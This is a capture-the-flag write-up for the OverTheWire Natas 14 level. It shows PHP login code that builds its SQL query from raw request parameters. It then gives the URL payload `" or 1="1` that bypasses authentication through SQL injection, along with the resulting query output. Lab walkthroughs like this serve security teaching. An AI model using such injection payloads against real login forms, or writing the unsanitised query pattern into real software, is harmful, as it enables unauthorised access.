# Natas 14 -> 15

```
http://natas14.natas.labs.overthewire.org
```

```
Username: natas14
```

This time we have a login form and the source code:

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? }
```

Well, there are *at least* two things we can use here:

* the `$query` is made using `$_REQUEST` (therefore we can use `$_GET`)
* Will print the query if we pass $_GET['debug']

Let's try that:  
```
?username=q&password=q&debug=1
```

Which prints

```
Executing query: SELECT * from users where username="q" and password="q"
Access denied!
```

Let's try again, now to get the password.

```
?username=q&password=q" or 1="1&debug=1
```

```
Executing query: SELECT * from users where username="q" and password="q" or 1="1"
Successful login!
```

* php
* mysql_connect
* $_REQUEST
* sqli
